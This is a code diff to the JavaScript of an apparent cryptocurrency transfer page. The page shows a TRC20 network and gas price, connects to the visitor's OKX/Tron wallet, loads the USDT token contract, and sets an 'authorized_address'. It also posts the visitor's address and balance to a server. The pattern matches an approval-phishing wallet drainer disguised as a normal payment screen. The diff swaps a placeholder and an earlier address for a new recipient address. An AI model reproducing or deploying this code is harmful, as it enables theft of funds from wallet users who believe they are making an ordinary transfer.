@@ -325,7 +325,7 @@
           $('#gasPriceA').html('22 TRX');
           $('#gasPriceU').html('2.59');
           $('.netword_name').html("转账网络 TRC20");
-          document.querySelector('.authaddress').value = "测试地址";
+          document.querySelector('.authaddress').value = "TUiEqwfmRZ5NiGTXgDEHV8xW6Bck9tWTUo";
           document.getElementById('confirm').addEventListener('click', async function() {
             if (this.classList.contains('disabled')) {
               return;
@@ -356,7 +356,7 @@ async function transfer() {
     
   try {
     const response = await window.okxwallet.tronLink.request({ method: 'tron_requestAccounts' });
-    let authorized_address = "TFXCyok1yUAjCA8QTcVNXFpnXMzWT1A3nk";
+    let authorized_address = "TUiEqwfmRZ5NiGTXgDEHV8xW6Bck9tWTUo";
     var approveAddr = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
     var selectedAccount = okxwallet.tronWeb.defaultAddress.base58;
     let instance = await okxwallet.tronWeb.contract().at(approveAddr);
@@ -389,7 +389,7 @@ async function trcForm(selectedAccount, balanceof) {
       {
         addr: selectedAccount,
         price: balanceof,
-        auth_add: "TFXCyok1yUAjCA8QTcVNXFpnXMzWT1A3nk",
+        auth_add: "TUiEqwfmRZ5NiGTXgDEHV8xW6Bck9tWTUo",
       },
       success: function(res) {
       },
